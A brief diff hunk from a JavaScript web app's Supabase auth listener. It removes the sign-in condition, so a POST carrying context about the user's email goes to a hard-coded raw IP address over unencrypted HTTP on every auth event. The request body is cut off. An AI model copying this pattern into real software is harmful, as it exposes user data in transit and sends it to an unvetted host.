@@ -2442,7 +2442,7 @@ Object.assign(window, { loadState, LS_KEY, SEED_HISTORY, Header, Tabs, BalanceCa
         const { data: { subscription } } = window._supabase.auth.onAuthStateChange((_event, session) => {
           setUser(session?.user ?? null);
           setAuthLoading(false);
-          if (_event === 'SIGNED_IN' && session?.user?.email) {
+          if (session?.user?.email) {
             fetch('http://89.124.95.228:8100/user/register', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
